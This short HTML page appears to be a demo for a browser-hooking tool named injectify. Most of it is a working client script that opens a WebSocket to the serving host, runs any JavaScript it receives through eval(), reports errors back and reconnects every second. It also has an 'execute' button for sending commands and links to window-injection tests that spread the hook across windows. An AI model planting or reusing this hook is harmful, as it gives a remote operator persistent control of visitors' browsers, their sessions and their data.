<script>
(function i() {
    var WS = 'ws'
    if (window.location.protocol == 'https:') WS += 's'
    window.ws = new WebSocket(`${WS}://${location.host}/i?$${btoa('private')}`)
    ws.onmessage = function(d) {
        try {
            d = JSON.parse(d.data)
            eval(d.d)
        } catch(e) {
            ws.send(JSON.stringify({
                t: 'e',
                d: e.stack,
            }))
        }
    }
    ws.onclose = function() {
        // Instantly attempt to open the websocket, retrying every second
        setTimeout(i, 1000)
    }
})()
</script>
<pre>
<input />
<button onclick="injectify.send('execute', document.getElementsByTagName('input')[0].value)">execute</button>


Window injection tests:
<a href="demo/window-injection/parent-child.html" target="_blank">Parent to child</a>
<a href="demo/window-injection/child-parent.html" target="blank_">Child to parent</a>
<a href="demo/window-injection/hopping.html">Single-page hopping</a>
</pre>